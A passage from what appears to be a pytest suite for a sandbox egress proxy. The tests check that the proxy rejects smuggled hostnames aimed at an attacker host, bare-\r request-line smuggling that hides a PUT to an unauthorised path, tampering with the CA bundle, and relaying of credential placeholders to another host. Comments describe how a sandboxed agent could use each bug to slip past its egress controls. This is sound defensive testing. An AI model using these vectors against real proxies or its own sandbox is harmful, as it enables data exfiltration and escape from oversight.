    lookup — DNS resolution is itself the exfil channel for this
    parser-differential bug, so a reject that ALSO leaks the lookup
    is not a fix.
    """

    async def _fail(host: str, _port: int, **_kw: object) -> list[object]:
        pytest.fail(
            f"{label}: getaddrinfo called for host={host!r} — the "
            f"proxy must reject smuggled hosts BEFORE any DNS lookup, "
            f"because the lookup itself leaks data to the attacker's "
            f"nameserver via subdomain labels."
        )

    return _fail


# Each smuggled hostname pairs with the CONNECT-target form
# (``host:port``) and (where applicable) the URL form
# (``http://host/...``). Whitespace / control chars that would
# terminate the request-line token are excluded — those can't
# physically reach the proxy past ``readline().split()`` parsing;
# they're covered at the rule-layer instead.
_CONNECT_SMUGGLED_HOST_VECTORS = [
    pytest.param("attacker.example.com\x00.allowed.com", id="nul-byte"),
    pytest.param("attacker.example.com\x00", id="nul-byte-trailing"),
    pytest.param("attacker.example.com%2e.allowed.com", id="percent-encoded-dot"),
    pytest.param("attacker.example.com%00.allowed.com", id="percent-encoded-nul"),
    # ``@`` only smuggles on the CONNECT path. ``urlparse`` strips
    # userinfo from HTTP URLs, so ``http://attacker@allowed.com/``
    # legitimately resolves to ``allowed.com`` and is not a vector
    # there.
    pytest.param("attacker@allowed.com", id="userinfo-at"),
    # Brackets reach ``_handle_http`` through ``urlparse``-raising
    # rather than through the strict-allowlist check, but the
    # response is the canonical 403 either way.
    pytest.param("attacker.example.com[evil].allowed.com", id="brackets"),
]

# HTTP-path subset: ``urlparse`` filters or rejects some vectors
# before they ever reach our strict-allowlist check, so we exclude
# those from the HTTP parametrization to avoid testing ``urlparse``'s
# behavior instead of ours.
_HTTP_SMUGGLED_HOST_VECTORS = [p for p in _CONNECT_SMUGGLED_HOST_VECTORS if p.id != "userinfo-at"]


@pytest.mark.asyncio
@pytest.mark.parametrize("smuggled_host", _CONNECT_SMUGGLED_HOST_VECTORS)
async def test_s5_connect_rejects_unsafe_host_before_dns(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
    smuggled_host: str,
) -> None:
    """CONNECT with a smuggled hostname is 403'd ahead of any DNS lookup,
    even when the suffix would otherwise match an allowed wildcard.
    """
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["* *.allowed.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)
    port = await proxy.start_tcp()

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _trap_getaddrinfo("CONNECT"))

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        request = (
            f"CONNECT {smuggled_host}:443 HTTP/1.1\r\nHost: {smuggled_host}:443\r\n\r\n"
        ).encode("latin-1")
        writer.write(request)
        await writer.drain()

        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        assert b"403 Forbidden" in response, (
            f"CONNECT with smuggled host {smuggled_host!r} MUST be 403'd. Got: {response[:200]!r}"
        )
        # Generic body — no oracle distinguishing "invalid host" from
        # "host not allowed" for a probing attacker.
        assert b"forbidden character" in response, (
            f"403 body should identify the rejection class without "
            f"leaking a probe distinguisher. Got: {response[:200]!r}"
        )
    finally:
        await proxy.stop()


@pytest.mark.asyncio
@pytest.mark.parametrize("smuggled_host", _HTTP_SMUGGLED_HOST_VECTORS)
async def test_s5_http_rejects_unsafe_host_before_dns(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
    smuggled_host: str,
) -> None:
    """Plain HTTP proxy GET with a smuggled host is 403'd ahead of
    any DNS lookup. Same parser-differential class as the CONNECT
    test above, but on the ``_handle_http`` code path.
    """
    cert_path, key_path, _ = ca_paths
    rules = parse_rules(["* *.allowed.com/**"])
    proxy = EgressProxy(rules, cert_path, key_path)
    port = await proxy.start_tcp()

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _trap_getaddrinfo("HTTP"))

    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        request = (
            f"GET http://{smuggled_host}/exfil?secret=AKIA HTTP/1.1\r\n"
            f"Host: {smuggled_host}\r\n"
            "\r\n"
        ).encode("latin-1")
        writer.write(request)
        await writer.drain()

        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()

        assert b"403 Forbidden" in response, (
            f"HTTP GET with smuggled host {smuggled_host!r} MUST be 403'd. Got: {response[:200]!r}"
        )
        assert b"forbidden character" in response, (
            f"403 body should identify the rejection class. Got: {response[:200]!r}"
        )
    finally:
        await proxy.stop()


# ---------------------------------------------------------------------------
# S6 — request-line smuggling on the CONNECT (MITM) path
#
# The CONNECT handler enforces its path/method allow-list against a
# parse of the inner (MITM-decrypted) request line, but historically
# forwarded the *raw* request-line bytes to the upstream verbatim. The
# policy parse uses ``str.split()`` (no argument), which treats bare
# ``\r``/``\t``/``\v``/``\f`` as whitespace. A sandboxed agent that
# controls the inner HTTP bytes could embed a bare ``\r`` so the proxy
# saw one (method, path) while a lenient upstream parsed a different,
# smuggled request line — collapsing a fine-grained egress rule
# (e.g. ``GET host/repos/myorg/**``) to "any method, any path" on an
# already-allow-listed host. The fix rejects control bytes in the inner
# request line AND re-serializes the forwarded request line from the
# parsed (method, path) so the policy decision and the forwarded bytes
# can never diverge.
# ---------------------------------------------------------------------------


def _resolve_to_loopback(ip: str = "127.0.0.1") -> callable:
    """Return a ``loop.getaddrinfo`` replacement resolving any host to
    *ip*, tolerant of the full ``family/type/proto/flags`` kwargs that
    ``loop.create_connection`` passes (unlike ``_stub_getaddrinfo_to``,
    which only accepts ``type``).
    """

    async def _fake(host: str, port: int, *_args: object, **_kwargs: object) -> list:
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, port))]

    return _fake


def _mitm_client_send_inner(
    proxy_port: int,
    connect_target: str,
    server_hostname: str,
    ca_bundle: Path,
    inner_request: bytes,
) -> bytes:
    """Blocking helper (run via ``asyncio.to_thread``): open CONNECT to
    the proxy, complete the inner MITM TLS handshake trusting
    *ca_bundle*, send *inner_request*, and return the inner HTTP
    response bytes.
    """
    raw = socket.create_connection(("127.0.0.1", proxy_port), timeout=10)
    try:
        connect = f"CONNECT {connect_target} HTTP/1.1\r\nHost: {server_hostname}\r\n\r\n"
        raw.sendall(connect.encode("latin-1"))
        # Drain the proxy's "200 Connection Established" header block.
        established = b""
        while b"\r\n\r\n" not in established:
            chunk = raw.recv(4096)
            if not chunk:
                break
            established += chunk

        ctx = ssl.create_default_context(cafile=str(ca_bundle))
        tls = ctx.wrap_socket(raw, server_hostname=server_hostname)
        try:
            tls.sendall(inner_request)
            response = b""
            while True:
                chunk = tls.recv(4096)
                if not chunk:
                    break
                response += chunk
            return response
        finally:
            with contextlib.suppress(Exception):
                tls.close()
    finally:
        with contextlib.suppress(Exception):
            raw.close()


@pytest.mark.asyncio
async def test_s6_connect_rejects_control_byte_in_inner_request_line(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A bare ``\\r`` in the inner request line is rejected with 403 and
    is NEVER forwarded upstream (request-smuggling proof-of-concept).

    Without the fix the proxy parsed ``GET /repos/myorg/allowed`` (the
    policy-allowed view) but forwarded the raw bytes
    ``GET /repos/myorg/allowed\\rPUT\\r/repos/OTHERORG/secret HTTP/1.1``
    verbatim, smuggling a ``PUT`` to a path the rule never authorized.
    """
    cert_path, key_path, bundle_path = ca_paths
    host = "allowed.example.com"

    # Recording TLS upstream — if the proxy ever forwarded the smuggled
    # request, the request line would land here. We assert it does not.
    received: list[bytes] = []

    async def _upstream(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        line = await reader.readline()
        received.append(line)
        writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        with contextlib.suppress(Exception):
            await writer.drain()
        writer.close()

    upstream_ctx = HostCertCache(cert_path, key_path).get_ssl_context(host)
    upstream = await asyncio.start_server(_upstream, "127.0.0.1", 0, ssl=upstream_ctx)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules([f"GET {host}/repos/myorg/**"]),
        cert_path,
        key_path,
        upstream_ca_bundle=bundle_path,
        # The upstream listens on loopback; skip the private-destination
        # block so we exercise the request-line path, not the dest check.
        block_private_destinations=False,
    )
    proxy_port = await proxy.start_tcp()

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _resolve_to_loopback())

    smuggled = (
        b"GET /repos/myorg/allowed\rPUT\r/repos/OTHERORG/secret HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n\r\n"
    )

    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(
                _mitm_client_send_inner,
                proxy_port,
                f"{host}:{upstream_port}",
                host,
                bundle_path,
                smuggled,
            ),
            timeout=15,
        )

        assert b"403 Forbidden" in response, (
            f"Inner request line with a bare \\r MUST be rejected with "
            f"403. Got: {response[:200]!r}"
        )
        assert received == [], (
            f"Smuggled request line MUST NOT reach the upstream — the "
            f"control byte has to be rejected before forwarding. "
            f"Upstream received: {received!r}"
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()


@pytest.mark.asyncio
async def test_s6_connect_reserializes_request_line_to_upstream(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The forwarded request line is re-serialized from the parsed
    (method, path), not echoed verbatim — so the upstream receives
    exactly what the policy authorized.

    We send a deliberately messy-but-benign request line (extra spaces,
    HTTP/1.0) and assert the upstream sees the normalized
    ``GET /repos/myorg/file HTTP/1.1`` line. This proves the proxy no
    longer forwards ``inner_first`` verbatim, closing the
    policy-vs-forwarded byte differential.
    """
    cert_path, key_path, bundle_path = ca_paths
    host = "allowed.example.com"

    received: list[bytes] = []

    async def _upstream(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        line = await reader.readline()
        received.append(line)
        writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        with contextlib.suppress(Exception):
            await writer.drain()
        writer.close()

    upstream_ctx = HostCertCache(cert_path, key_path).get_ssl_context(host)
    upstream = await asyncio.start_server(_upstream, "127.0.0.1", 0, ssl=upstream_ctx)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules([f"GET {host}/repos/myorg/**"]),
        cert_path,
        key_path,
        upstream_ca_bundle=bundle_path,
        block_private_destinations=False,
    )
    proxy_port = await proxy.start_tcp()

    loop = asyncio.get_event_loop()
    monkeypatch.setattr(loop, "getaddrinfo", _resolve_to_loopback())

    messy = b"GET   /repos/myorg/file   HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n"

    try:
        response = await asyncio.wait_for(
            asyncio.to_thread(
                _mitm_client_send_inner,
                proxy_port,
                f"{host}:{upstream_port}",
                host,
                bundle_path,
                messy,
            ),
            timeout=15,
        )

        assert b"200 OK" in response, (
            f"Benign allowed request should be forwarded and succeed. Got: {response[:200]!r}"
        )
        assert received == [b"GET /repos/myorg/file HTTP/1.1\r\n"], (
            f"Upstream MUST receive the request line re-serialized from "
            f"the parsed (method, path), not the verbatim inner bytes. "
            f"Got: {received!r}"
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()


# ---------------------------------------------------------------------------
# Upstream trust anchor pinned at construction, not re-read per request
#
# The proxy's upstream TLS verification context MUST be built once in
# ``__init__`` from the configured CA bundle and reused for every
# request. The vulnerable implementation called
# ``ssl.create_default_context(cafile=str(self._upstream_ca_bundle))``
# inside ``_forward_https`` on EVERY request. Because the controller
# handed it a copy of the bundle living in the sandbox-writable scratch
# tmpdir, a sandboxed agent could append its own CA (so the parent
# trusts attacker-issued certs for allow-listed upstreams) or truncate
# the file (self-DoS) and the change would take effect on the next
# forward. The fix sources the context from the host-only bundle and
# pins it at construction.
# ---------------------------------------------------------------------------


@dataclass
class _TunnelProbeOutcome:
    """Result of a single HTTPS-over-CONNECT request through the proxy.

    Captures either the inner HTTP status the proxy returned over the
    established TLS tunnel, or the client-side exception that ended the
    request before any status arrived (a torn tunnel).

    :param status: The inner HTTP status code the proxy returned over
        the MITM tunnel, e.g. ``502``. ``None`` when the tunnel was
        torn before a response line was read.
    :param error: ``"<ExcType>: <msg>"`` for the client-side exception
        that ended the request, e.g.
        ``"RemoteDisconnected: Remote end closed connection ..."``.
        ``None`` on a clean response.
    """

    status: int | None
    error: str | None


def _tunnel_get_through_proxy(
    proxy_port: int, ca_bundle_pem: str, host: str
) -> _TunnelProbeOutcome:
    """Issue ``GET https://<host>/`` through the MITM proxy and report
    the inner status (or the tearing exception).

    Runs the blocking ``http.client`` tunnel client so it can be driven
    from an async test via :func:`asyncio.to_thread` without touching
    the proxy's event loop. The client trusts the MITM CA via *in-memory*
    PEM (``cadata``) rather than a file path, so the test can delete the
    proxy's configured bundle without disturbing the client's own trust.

    :param proxy_port: Loopback TCP port the :class:`EgressProxy` is
        listening on (from ``start_tcp``).
    :param ca_bundle_pem: The MITM CA bundle as PEM text, used to build
        the client's trust store so the inner TLS handshake against the
        proxy's synthesized leaf cert succeeds.
    :param host: The CONNECT target / inner ``Host`` (a DNS name so the
        MITM leaf's DNS SAN matches), e.g. ``"allowed.test"``.
    :returns: A :class:`_TunnelProbeOutcome` describing what the client
        observed.
    """
    import http.client

    ctx = ssl.create_default_context(cadata=ca_bundle_pem)
    conn = http.client.HTTPSConnection("127.0.0.1", proxy_port, context=ctx, timeout=10)
    try:
        conn.set_tunnel(host, 443)
        conn.request("GET", "/", headers={"Host": host, "Connection": "close"})
        resp = conn.getresponse()
        return _TunnelProbeOutcome(status=resp.status, error=None)
    except Exception as exc:
        # The test deliberately captures any client-side exception (e.g.
        # RemoteDisconnected from a torn tunnel) as the regression signal.
        return _TunnelProbeOutcome(status=None, error=f"{type(exc).__name__}: {exc}")
    finally:
        with contextlib.suppress(Exception):
            conn.close()


@pytest.mark.asyncio
async def test_upstream_ca_pinned_at_construction_not_reread_per_request(
    ca_paths: tuple[Path, Path, Path],
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The upstream verification context is built ONCE at construction;
    mutating/removing the configured CA bundle file afterward does NOT
    affect request handling.

    This is the regression guard for the upstream-CA-bundle re-read
    vulnerability. The probe completes a real MITM TLS tunnel to an
    allow-listed host and sends an inner GET. DNS
    for that host is stubbed to fail, so the proxy reaches the upstream
    connect and returns ``502`` — proving ``_forward_https`` ran all the
    way to the upstream open (which requires the upstream SSL context to
    have been built successfully).

    We then DELETE the bundle file the proxy was constructed with and
    repeat the request. With the fix, the proxy reuses the context it
    pinned in ``__init__`` and still returns ``502``. With the
    vulnerable code (``ssl.create_default_context(cafile=...)`` on every
    request), the now-missing file raises ``FileNotFoundError`` inside
    ``_forward_https``, the handler aborts, and the client sees a torn
    tunnel (no inner status) — so this test would fail. Deleting the
    file stands in for the agent mutating the sandbox-writable copy the
    vulnerable controller passed in: if the proxy re-reads it per
    request, the agent's change takes effect.
    """
    cert_path, key_path, bundle_path = ca_paths
    upstream_host = "allowed.test"
    proxy = EgressProxy(
        parse_rules([f"GET {upstream_host}/**"]),
        cert_path,
        key_path,
        # The configured bundle — the proxy must read this exactly once,
        # here, and never again. The test deletes it mid-flight below.
        upstream_ca_bundle=bundle_path,
        # Skip the private-destination guard so the destination check
        # doesn't resolve DNS itself (it fails closed on a DNS error).
        # We want the request to reach the upstream open_connection and
        # fail THERE, yielding a 502 we can observe over the tunnel.
        block_private_destinations=False,
    )
    port = await proxy.start_tcp()

    # Stub DNS so the upstream open_connection fails deterministically
    # (offline, no real network) and the proxy returns 502 instead of
    # dialing a real host. Loopback still resolves so the test client
    # can reach the proxy's listener.
    loop = asyncio.get_event_loop()
    real_getaddrinfo = loop.getaddrinfo

    async def _stub_getaddrinfo(host: str, port: int, **kwargs: object) -> list:
        if host in ("127.0.0.1", "localhost", "::1"):
            return await real_getaddrinfo(host, port, **kwargs)  # type: ignore[arg-type]
        raise socket.gaierror(socket.EAI_NONAME, f"stubbed NXDOMAIN for {host}")

    monkeypatch.setattr(loop, "getaddrinfo", _stub_getaddrinfo)

    # Read the MITM CA into memory once so the client's trust survives
    # the file deletion that simulates the attacker's mutation.
    ca_bundle_pem = bundle_path.read_text()

    try:
        # Baseline: with the bundle present, the proxy builds the
        # upstream context, attempts the (stubbed-to-fail) upstream
        # connect, and returns 502 over the tunnel. 502 here proves
        # _forward_https reached the upstream-open stage.
        before = await asyncio.to_thread(
            _tunnel_get_through_proxy, port, ca_bundle_pem, upstream_host
        )
        assert before.status == 502, (
            f"Baseline request did not reach the upstream-connect stage. "
            f"Expected inner status 502 (upstream DNS stubbed to fail), got "
            f"status={before.status!r} error={before.error!r}. If this isn't "
            f"502 the test setup is wrong, not the fix."
        )

        # Attacker action stand-in: the file the proxy was told to use as
        # its upstream trust anchor is mutated/removed. A pinned context
        # is immune; a per-request cafile read is not.
        bundle_path.unlink()

        after = await asyncio.to_thread(
            _tunnel_get_through_proxy, port, ca_bundle_pem, upstream_host
        )
        assert after.status == 502, (
            f"After deleting the configured CA bundle, the proxy failed to "
            f"serve the request (got status={after.status!r} error={after.error!r}). "
            f"This means _forward_https re-read the now-missing cafile per "
            f"request (FileNotFoundError tore the tunnel) instead of reusing "
            f"the context pinned in __init__ — regression: the upstream trust "
            f"anchor is sourced from a mutable, per-request file read."
        )
    finally:
        await proxy.stop()


# ---------------------------------------------------------------------------
# Credential-proxy rewrite (secretless credential_proxy) — real round trips
# through the plain-HTTP proxy path with a local capturing upstream.
# ---------------------------------------------------------------------------


@dataclass
class _CapturedRequest:
    """Selected headers captured by the local upstream.

    :param authorization: The exact ``Authorization`` header value the
        upstream received, e.g. ``"Bearer real-secret"``, or ``None``
        when the request carried no such header.
    :param connection: Every ``Connection`` header value the upstream
        received, lowercased, in order. A list (not a scalar) so a test
        can assert the proxy collapsed any client-supplied
        ``Connection`` / ``Keep-Alive`` headers into exactly one
        ``close`` rather than forwarding duplicates.
    """

    authorization: str | None
    connection: list[str] = field(default_factory=list)


async def _start_capturing_upstream(captured: list[_CapturedRequest]) -> asyncio.Server:
    """Start a loopback HTTP server that records each ``Authorization`` header.

    The server reads the request head, appends the captured authorization
    to *captured*, and always replies ``200 OK``. This is the upstream the
    proxy forwards rewritten requests to, so the captured value is exactly
    what crossed the proxy boundary toward the real service.

    :param captured: List the server appends one entry to per request.
    :returns: A running :class:`asyncio.Server` on ``127.0.0.1``.
    """

    async def _handle(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        head = await reader.readuntil(b"\r\n\r\n")
        auth: str | None = None
        connection: list[str] = []
        for line in head.split(b"\r\n"):
            if line[:14].lower() == b"authorization:":
                auth = line.partition(b":")[2].strip().decode("latin-1")
            elif line[:11].lower() == b"connection:":
                connection.append(line.partition(b":")[2].strip().decode("latin-1").lower())
        captured.append(_CapturedRequest(authorization=auth, connection=connection))
        writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
        await writer.drain()
        writer.close()

    return await asyncio.start_server(_handle, "127.0.0.1", 0)


async def _proxied_http_get(
    *,
    proxy_port: int,
    upstream_port: int,
    authorization: str | None,
) -> bytes:
    """Send one plain-HTTP GET through the proxy, optionally authenticated.

    :param proxy_port: Loopback TCP port the proxy listens on.
    :param upstream_port: Port of the local capturing upstream.
    :param authorization: The raw ``Authorization`` value the sandbox
        would send (carrying a synthetic placeholder), or ``None`` to
        send a bare request with no ``Authorization`` header — the
        swap-on-access client shape.
    :returns: The raw response bytes the client received from the proxy.
    """
    reader, writer = await asyncio.open_connection("127.0.0.1", proxy_port)
    auth_line = f"Authorization: {authorization}\r\n" if authorization is not None else ""
    request = (
        f"GET http://127.0.0.1:{upstream_port}/probe HTTP/1.1\r\n"
        f"Host: 127.0.0.1:{upstream_port}\r\n"
        f"{auth_line}"
        "Connection: close\r\n"
        "\r\n"
    ).encode("latin-1")
    writer.write(request)
    await writer.drain()
    response = await asyncio.wait_for(reader.read(4096), timeout=5)
    writer.close()
    with contextlib.suppress(Exception):
        await writer.wait_closed()
    return response


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "scheme,username,sent_authorization_tmpl,expected_upstream",
    [
        # bearer: sandbox sends "Bearer <synthetic>"; upstream gets the real secret.
        ("bearer", None, "Bearer {synthetic}", "Bearer real-secret-value"),
        # token (GitHub CLI): sandbox sends "token <synthetic>".
        ("token", None, "token {synthetic}", "token real-secret-value"),
    ],
)
async def test_credential_rewrite_swaps_bearer_and_token(
    ca_paths: tuple[Path, Path, Path],
    scheme: str,
    username: str | None,
    sent_authorization_tmpl: str,
    expected_upstream: str,
) -> None:
    """The proxy swaps a synthetic bearer/token placeholder for the real secret.

    A failure means the rewrite didn't fire (upstream would see the
    synthetic, never the real value) — i.e. the secretless proxy isn't
    actually authenticating the upstream call.
    """
    cert_path, key_path, _ = ca_paths
    synthetic = f"{SYNTHETIC_CREDENTIAL_PREFIX}abc123"
    rule = CredentialRewriteRule(
        host="127.0.0.1",
        scheme=scheme,
        synthetic=synthetic,
        real_secret="real-secret-value",
        username=username,
    )
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
        credential_rewrites=[rule],
    )
    proxy_port = await proxy.start_tcp()
    try:
        response = await _proxied_http_get(
            proxy_port=proxy_port,
            upstream_port=upstream_port,
            authorization=sent_authorization_tmpl.format(synthetic=synthetic),
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    assert b"200 OK" in response, f"Request did not complete through proxy: {response[:200]!r}"
    assert len(captured) == 1, "Upstream should have received exactly one request"
    # The upstream MUST receive the REAL secret, formatted per the rule's
    # scheme — proving the synthetic→real swap happened at the proxy.
    assert captured[0].authorization == expected_upstream
    # And the synthetic placeholder must NOT have leaked upstream.
    assert synthetic not in (captured[0].authorization or "")


@pytest.mark.asyncio
async def test_credential_rewrite_swaps_basic_password(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """A Basic-auth synthetic password is swapped for the real secret upstream.

    Covers the git_https / https_basic shape where the synthetic lives in
    the password field of ``Basic base64(user:pass)``.
    """
    cert_path, key_path, _ = ca_paths
    synthetic = f"{SYNTHETIC_CREDENTIAL_PREFIX}basicpw"
    rule = CredentialRewriteRule(
        host="127.0.0.1",
        scheme="basic",
        synthetic=synthetic,
        real_secret="gho_realtoken",
        username="x-access-token",
    )
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    sent = "Basic " + base64.b64encode(f"x-access-token:{synthetic}".encode()).decode()
    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
        credential_rewrites=[rule],
    )
    proxy_port = await proxy.start_tcp()
    try:
        response = await _proxied_http_get(
            proxy_port=proxy_port,
            upstream_port=upstream_port,
            authorization=sent,
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    assert b"200 OK" in response, f"Request did not complete: {response[:200]!r}"
    # Exactly one upstream request — the proxy forwarded once, not 0
    # (dropped) or >1 (retried/duplicated).
    assert len(captured) == 1
    received = captured[0].authorization or ""
    assert received.startswith("Basic ")
    decoded = base64.b64decode(received.split(" ", 1)[1]).decode()
    # The real token reaches upstream in the password field, behind the
    # configured username — the synthetic must be gone.
    assert decoded == "x-access-token:gho_realtoken"
    assert synthetic not in decoded


@pytest.mark.asyncio
async def test_credential_rewrite_rejects_synthetic_on_wrong_host(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """A placeholder bound to one host is refused (403) when sent to another.

    This is the leak guard: a compromised sandbox must not be able to
    relay its synthetic placeholder to an attacker-controlled host. If the
    binding check regressed, the proxy would forward the request and the
    upstream would receive a (swapped) real secret — a credential
    exfiltration. The test asserts the request is 403'd and the upstream
    is never contacted.
    """
    cert_path, key_path, _ = ca_paths
    synthetic = f"{SYNTHETIC_CREDENTIAL_PREFIX}boundelsewhere"
    # Rule binds the synthetic to a DIFFERENT host than the request target.
    rule = CredentialRewriteRule(
        host="api.github.com",
        scheme="bearer",
        synthetic=synthetic,
        real_secret="real-secret-value",
        username=None,
    )
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
        credential_rewrites=[rule],
    )
    proxy_port = await proxy.start_tcp()
    try:
        response = await _proxied_http_get(
            proxy_port=proxy_port,
            upstream_port=upstream_port,
            authorization=f"Bearer {synthetic}",
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    # 403 = the proxy refused to forward the cross-host placeholder.
    assert b"403 Forbidden" in response, (
        f"Synthetic bound to api.github.com MUST be refused on 127.0.0.1. Got: {response[:200]!r}"
    )
    # The upstream must NEVER have been reached — no swapped secret leaked.
    assert captured == []


@pytest.mark.asyncio
async def test_credential_rewrite_passes_through_non_synthetic(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """A real (non-synthetic) Authorization header is forwarded untouched.

    Ensures the rewrite only acts on this proxy's own placeholders and
    never mangles a legitimate token a tool sends directly.
    """
    cert_path, key_path, _ = ca_paths
    rule = CredentialRewriteRule(
        host="127.0.0.1",
        scheme="bearer",
        synthetic=f"{SYNTHETIC_CREDENTIAL_PREFIX}unused",
        real_secret="real-secret-value",
        username=None,
    )
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
        credential_rewrites=[rule],
    )
    proxy_port = await proxy.start_tcp()
    try:
        response = await _proxied_http_get(
            proxy_port=proxy_port,
            upstream_port=upstream_port,
            authorization="Bearer a-users-own-real-token",
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    assert b"200 OK" in response
    # Exactly one forwarded request (not dropped, not duplicated).
    assert len(captured) == 1
    # Non-synthetic header forwarded verbatim — no accidental rewrite.
    assert captured[0].authorization == "Bearer a-users-own-real-token"


@pytest.mark.asyncio
async def test_credential_rewrite_injects_on_access_without_header(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """Swap-on-access: a bare request to a bound host gets the real credential.

    This is the default model — the entry injected nothing into the
    sandbox (``synthetic=None``), so the request arrives with no
    ``Authorization`` header and the proxy attaches the real credential on
    the way out. If injection regressed, the upstream would receive no
    ``Authorization`` header (``None``) and authenticate as nobody.
    """
    cert_path, key_path, _ = ca_paths
    rule = CredentialRewriteRule(
        host="127.0.0.1",
        scheme="bearer",
        real_secret="real-secret-value",
        synthetic=None,
        username=None,
    )
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
        credential_rewrites=[rule],
    )
    proxy_port = await proxy.start_tcp()
    try:
        response = await _proxied_http_get(
            proxy_port=proxy_port,
            upstream_port=upstream_port,
            authorization=None,
        )
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    assert b"200 OK" in response, f"Request did not complete: {response[:200]!r}"
    assert len(captured) == 1
    # The proxy synthesized the Authorization header from the rule — the
    # client sent none.
    assert captured[0].authorization == "Bearer real-secret-value"


# ---------------------------------------------------------------------------
# Single-shot upstream framing (Connection: close) and shutdown draining.
#
# Regression coverage for the git-over-proxy hang: the proxy serves one
# inner request per upstream connection and relays by reading to EOF, so a
# keep-alive upstream would park the relay until its 60 s timeout and a
# pipelining client (git's libcurl: unauth /info/refs -> 401 -> auth retry
# on the same tunnel) would stall. ``_force_connection_close`` makes every
# forwarded request single-shot; ``stop`` cancels handlers still parked in
# a read so they don't leak past the loop.
# ---------------------------------------------------------------------------


def test_force_connection_close_replaces_hop_by_hop_headers() -> None:
    """``_force_connection_close`` collapses connection headers to one ``close``.

    The header block the proxy forwards upstream MUST carry exactly one
    ``Connection: close`` and none of the client's keep-alive-flavored
    hop-by-hop headers (``Connection`` / ``Proxy-Connection`` /
    ``Keep-Alive``). If any survived, a keep-alive upstream would hold the
    socket open and ``_relay_response`` would block until its timeout
    instead of returning at end-of-body. The directive must also land in
    the header section (before the blank-line separator), not after it.
    """
    headers = (
        b"Host: example.com\r\n"
        b"Connection: keep-alive\r\n"
        b"Proxy-Connection: keep-alive\r\n"
        b"Keep-Alive: timeout=5, max=100\r\n"
        b"User-Agent: probe\r\n"
        b"\r\n"
    )

    out = EgressProxy._force_connection_close(headers)

    head, sep, _body = out.partition(b"\r\n\r\n")
    assert sep == b"\r\n\r\n", "header block must retain its blank-line terminator"
    lines = head.split(b"\r\n")
    # Exactly one Connection header, and it is the forced close.
    connection_lines = [ln for ln in lines if ln.lower().startswith(b"connection:")]
    assert connection_lines == [b"Connection: close"], connection_lines
    # None of the keep-alive-flavored hop-by-hop headers survived.
    assert not any(ln.lower().startswith(b"proxy-connection:") for ln in lines)
    assert not any(ln.lower().startswith(b"keep-alive:") for ln in lines)
    # Unrelated headers are preserved untouched.
    assert b"Host: example.com" in lines
    assert b"User-Agent: probe" in lines


@pytest.mark.asyncio
async def test_forwarded_request_is_single_shot_connection_close(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """A keep-alive client request reaches the upstream as ``Connection: close``.

    End-to-end proof that ``_force_connection_close`` is wired into the
